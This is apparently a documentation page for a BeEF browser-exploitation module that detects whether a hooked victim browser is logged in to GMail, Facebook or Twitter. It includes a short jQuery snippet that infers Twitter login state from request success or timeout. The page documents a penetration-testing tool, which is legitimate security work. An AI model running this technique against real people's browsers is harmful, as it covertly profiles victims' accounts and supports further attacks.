## Summary

* **Objective**: Detect social networks
* **Authors**: xntrik, Mike Cardwell
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/network/detect_soc_nets)

## Internal Working

This module will detect if the Hooked Browser is currently authenticated to GMail, Facebook and Twitter, using img tags and AJAX requests.

**example for twitter**

```js

$j.ajax({
        url: "https://twitter.com/account/use_phx?setting=false&amp;format=text",
        dataType: "script",
        cache: "false",
        complete: function(one, two) {
                if (two == "success") {
                        twitterresult = "User is NOT authenticated to Twitter (response:"+two+")";
                } else if (two == "timeout") {
                        twitterresult = "User is authenticated to Twitter (response:"+two+")";
                }
        },
        timeout: <%= @timeout %>
});

```

## Screenshots

[[Images/module-detect-social-network.png|align=center|width=500px]]

## Feedback
